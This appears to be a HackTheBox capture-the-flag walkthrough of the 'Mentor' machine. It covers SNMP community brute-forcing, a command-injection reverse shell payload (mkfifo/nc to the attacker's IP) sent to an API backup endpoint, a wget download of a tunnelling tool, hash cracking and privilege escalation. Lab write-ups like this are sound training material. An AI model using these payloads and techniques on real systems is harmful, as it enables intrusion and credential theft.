---
title: "HTB - Mentor"
categories: [box]
date: 2022-12-08
comments: true
image: /images/walkthroughs/hackthebox/mentor/logo.png
favicon: /images/walkthroughs/hackthebox/mentor/logo.png
description: HTB - Mentor walkthrough
---

# Mentor 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/banner.png" width="70%"/>
</p>


## Summary

Mentor is a medium difficulty box where we have a website and an API. After long enumeration, there is not much more to do with that, no vulnerabilities on the API nor the website, no hints on the website posts or whatever. Rerunning all the process again, I discovered SNMP UDP port open. Bruteforcing the SNMPv2c communities (ended up creating a script for that), we found internal, which shows hrSWRunStatus OID with a set of commands and james's API password in an argument.
From there we reach the API, where admin has the capability to make backups. This functionality has command injection vulnerability, so we could create a revshell to a docker container. Within the container, we spot a config file for a PostgreSQL DB with the credentials. Using an SSH tunnel we can reach it and check the svc user MD5 hash, which could be cracked on crackstation.

Using those credentials, we get in as user SVC via SSH. For lateral movement, we found the SNMP configuration file with cleartext credentials, which were reused by james user in the machine, so we can switch user to james.

Privesc is strait forward, since james can sudo /bin/sh.


## Enumeration

- nmap

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 15:27 EST
Nmap scan report for 10.129.228.102
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's add mentorquotes.htb to _/etc/hosts_.

We have a Flask website with version 2.0.3 and Python 3.6.9:
Server: Werkzeug/2.0.3 Python/3.6.9


- gobuster

```bash
gobuster dir -u "http://mentorquotes.htb/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 30 -x html,txt,pdf,py 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mentorquotes.htb/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt,pdf,py
[+] Timeout:                 10s
===============================================================
2022/12/11 15:46:53 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 5506]
/server-status        (Status: 403) [Size: 281]
```

Nothing interesting in gobuster


- ffuf

At this stage I always expect a subdomain to appear and it happened. It took me some minutes since I was filtering for 302 status code, but in the end I tried without a filter and I saw a yellow line scrolling:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/1_0_api.png" width="90%"/>
</p>


I realize that the code 404 was missing from matcher rule, so when retrying I set to match all except 302. I should also filter for size or lines, that would help me at that time.


```bash
ffuf -c -u 'http://mentorquotes.htb' -H 'Host: FUZZ.mentorquotes.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fc 302 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/'       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://mentorquotes.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mentorquotes.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 302
________________________________________________

api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 45ms]

```


So let's anumerate the api (afer adding the domain name to the /etc/hosts):


- gobuster (api):

```bash
gobuster dir -u "http://api.mentorquotes.htb/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 30
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api.mentorquotes.htb/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/13 12:15:12 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
/docs                 (Status: 200) [Size: 969]
/quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/]
/server-status        (Status: 403) [Size: 285]
/users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]

```

We have a Swagger on the docs, nice. Anyway, if I got stucked I could run the API wordlist in SecLists (just in case).


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/1_1_swagger.png" width="90%"/>
</p>

We also find an email address:

james@mentorquotes.htb


Now let's mess around with the API. First request responds with this header, just taking notes:

Server: uvicorn

So I registered in the app and it shows in the URL the ID 4... Interesting, first thing will to try an IDOR.


```bash
POST /auth/signup HTTP/1.1
Host: api.mentorquotes.htb
Content-Length: 84
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Referer: http://api.mentorquotes.htb/docs
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
  "email": "kashmir@kash.com",
  "username": "kashmir",
  "password": "hasmir54"
}


#Response

{"id":4,"email":"kashmir@kash.com","username":"kashmir"}
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/1_2_created.png" width="90%"/>
</p>


Login in will grant us a token:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/1_3_login.png" width="90%"/>
</p>


```bash
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
Content-Length: 84
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Referer: http://api.mentorquotes.htb/docs
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
  "email": "kashmir@kash.com",
  "username": "kashmir",
  "password": "hasmir54"
}

# Response
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imthc2htaXIiLCJlbWFpbCI6Imthc2htaXJAa2FzaC5jb20ifQ.C14f3axJ7bZ9hOnglFwEHGO2D1YLj9z9rcoVeZ014Cg"
```

It's a JWT with the following content:


```json
{"typ":"JWT","alg":"HS256"}
{"username":"kashmir","email":"kashmir@kash.com"}
.µáýÚÄ.ÛgØN.  EÀAÆ;`õ`¸ýÏÚÜ¡W.Ó^.
```


Only admins can list users:


```bash
GET /users/ HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imthc2htaXIiLCJlbWFpbCI6Imthc2htaXJAa2FzaC5jb20ifQ.C14f3axJ7bZ9hOnglFwEHGO2D1YLj9z9rcoVeZ014Cg
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"detail":"Only admin users can access this resource"}

```

Let's try to crack and attack the JWT:

```bash
# Attacks
python3 jwt_tool.py -M at -t "http://api.mentorquotes.htb/quotes/" -rh "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imthc2htaXIiLCJlbWFpbCI6Imthc2htaXJAa2FzaC5jb20ifQ.C14f3axJ7bZ9hOnglFwEHGO2D1YLj9z9rcoVeZ014Cg"

# Crack
python3 jwt_tool.py -C eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imthc2htaXIiLCJlbWFpbCI6Imthc2htaXJAa2FzaC5jb20ifQ.C14f3axJ7bZ9hOnglFwEHGO2D1YLj9z9rcoVeZ014Cg -d /usr/share/wordlists/rockyou.txt
```

None of the JWTs common vulns or cracks worked.
Currently I got no ideas where to go, tried SQLs, API overwrite, longer wordlists on feroxbuster, JWT, common passwords, curated wordlist for james, software vulns... There is not much I can do with the API right now. 


I came back into enumeration, trying harder, starting from nmap again and also scanning the UDP ports. I found the port 161 (SNMP) open:

```bash
sudo nmap -sU 10.129.228.102 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 09:05 CET
Stats: 0:02:26 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 25.51% done; ETC: 10:14 (0:07:09 remaining)
Stats: 0:05:53 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 46.11% done; ETC: 10:17 (0:06:53 remaining)
Nmap scan report for api.mentorquotes.htb (10.129.228.102)
Host is up (0.040s latency).
Not shown: 912 closed udp ports (port-unreach), 87 open|filtered udp ports (no-response)

PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 1905.47 seconds
```


Since it is open, we can try to query some SNMP requests to extract information about the network. I found _snmpwalk_, which is preinstalled in kali:


```bash
snmpwalk -v1 10.129.228.102 -c public                      
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (5830727) 16:11:47.27
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
```

We can see that it accepts v1 and v2c versions:

```bash
# Using version 1

kali@kali:~/Desktop/HackTheBox/Mentor$ snmp-check 10.129.228.102 -c public -v1  
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 18:51:41.04
  Uptime system                 : 18:51:28.80
  System date                   : 2023-1-28 11:53:31.0


# Using version 2c

kali@kali:~/Desktop/HackTheBox/Mentor$ snmp-check 10.129.228.102 -c public -v2c  
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.228.102:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 10.129.228.102
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 18:52:01.35
  Uptime system                 : 18:51:49.11
  System date                   : 2023-1-28 11:53:51.0

[*] Network information:

  Default TTL                   : noSuchObject
  TCP segments received         : noSuchObject
  TCP segments sent             : noSuchObject
  TCP segments retrans          : noSuchObject
  Input datagrams               : noSuchObject
  Delivered datagrams           : noSuchObject
  Output datagrams              : noSuchObject

[*] File system information:

  Index                         : noSuchObject
  Mount point                   : noSuchObject
  Access                        : noSuchObject
  Bootable                      : noSuchObject
```


So far we get only that information. Checking further on the possibilities we had, I decided to bruteforce for more communities. Current is **public**, but could be more communities in there. I used nmap, hydra, onesixtyone with seclist _Discovery/SNMP/common-snmp-community-strings.txt_ but got nothing. Inspecting the wireshark captures, I saw that only SNMPv1 was being used, no news about v2c...


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/2_1_wire.png" width="90%"/>
</p>


Looking for a tool I didn't find one that would do SNMPv2c (I refused to try metasploit). So I created [my own tool for SNMP bruteforcing](https://github.com/kashmir54/snmp_bruteforce). The output is as follows:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/2_2_snmp.png" width="90%"/>
</p>


So we find the community **internal** on the SNMPv2c. Dumping all the information with snmpwalk:

```bash
snmpwalk -v2c 10.129.228.102 -c internal > snmp_walk.out
```

Checking out the output we had 8000+ lines. Looking for more information, specifically on [zabbix forums](https://www.zabbix.com/forum/zabbix-help/424409-process-monitoring-via-snmp) I found that there is an [OID that registers running processes](https://oidref.com/1.3.6.1.2.1.25.4.2.1). I used it to check the lines in the snmpwalk output and we find a login script that runs with an interesting argument...


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_0_pass.png" width="90%"/>
</p>


Could it be james password for the API? Yes it was:

**james:kj23sadkj123as0-d213**

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_1_works.png" width="90%"/>
</p>


With the token now we look into the rest of the users and the path _admin_ we discovered with feroxbuster:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_2_users.png" width="90%"/>
</p>

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_3_admin.png" width="90%"/>
</p>


With the /check we get **not implemented yet**. With the /backup endpoint it said **method not allowed**, let's try to POST something...

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_4_backup.png" width="90%"/>
</p>

It says that we need a body and a path, so let's place a dummy payload:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_5_test.png" width="90%"/>
</p>


Well, seems like it works, but I had no feedback on that. I tried to connect with SSH but cannot, even with the svc user. Trying for some command injection we have the WGET request returned to our server, so we confirmed that we have command injeciton:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/3_6_wget.png" width="90%"/>
</p>


With the following payload to the /admin/backup endpoint we get a revshell:


```json
{
  "body":"this",
  "path":"asdf;mkfifo /tmp/f; nc 10.10.14.2 5454 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f"
}
```


We land as root, checking for the .dockerenv file we can confirm that it is a container. 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/4_0_docker.png" width="90%"/>
</p>

Looking around the app code we can see a postgres (we also saw that in the SNMP output file):


```python
cat db.py
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
```

Also we have the password for the Postgres: **postgres:postgres**

Since the script was connecting tom the 172.22.0.1 (the host of the container), we could set up an SSH tunnel with chisel so we can reach that IP/Port. Using _uname -a_ command we get to know that the container is x86_64, so we download the latest binary for the [chisel tool](https://github.com/jpillora/chisel/releases/tag/v1.8.1). Make sure to use the same binary for the server (on our attack box) and the client (on the container in this case), that way we will avoid any strange behaviours.

Once downloaded, run the server:

```bash
./chisel_32 server -p 8000 --reverse
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/4_1_chisel_server.png" width="90%"/>
</p>


And the client on the remote host. Make sure to set the executable permissions:


```bash
wget http://10.10.14.2:5455/chisel_32
chmod +x chisel_32
./chisel_32 client 10.10.14.2:8000 R:5432:172.22.0.1:5432
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/4_1_chisel_client.png" width="90%"/>
</p>


Now, in other tab, we can connect to the PostgresQL as it was local:


```bash
psql -h 127.0.0.1 -p 5432 -d mentorquotes_db -U postgres
```

We can enumerate a little bit:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/5_0_psql.png" width="90%"/>
</p>


We find a user table (expected) and we can see the james account (we already have its password) and the svc account

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/5_1_content.png" width="90%"/>
</p>


```sql
mentorquotes_db=# SELECT * FROM users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
```

Using [crackstation](https://crackstation.net/) we get the password for svc

**service_acc:123meunomeeivani**


And we got into the machine using the **svc** on SSH and that password:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/6_0_user.png" width="90%"/>
</p>


## Lateral movement to james


Running linpeas, these outputs stood out:

```bash

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                     
You own the script: /usr/local/bin/login.sh                                                                                                                                                    
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                                       
drwxr-xr-x  3 root root 4096 Jun  3  2022 .
drwxr-xr-x 19 root root 4096 Nov 10 16:00 ..
drwx--x--x  4 root root 4096 Jun  3  2022 containerd

╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                                                                  
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
-rw------- 1 Debian-snmp Debian-snmp 1268 Jan 28 17:37 /var/lib/snmp/snmpd.conf

```

Looking at them, the one with real value was the SNMP configuration file, which has the following credential in cleartext:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/6_1_password.png" width="90%"/>
</p>


```bash
# include a all *.conf files in a directory
includeDir /etc/snmp/snmpd.conf.d


createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
#view SystemView included .1.3.6.1.2.1.1
view SystemView included .1.3.6.1.2.1.25.1.1

```

And it turns out that it is reused by james on the machine. We can su (switch user) or bring another SSH session with that user:

**james:SuperSecurePassword123\_\_**


## Privesc

Once as james, we run sudo -l (since we know the password) and discover that james can run sh as sudo. Kinda shocking, fastest privesc in my life -.-"


<p align="center">
  <img src="/images/walkthroughs/hackthebox/mentor/7_0_root.png" width="90%"/>
</p>


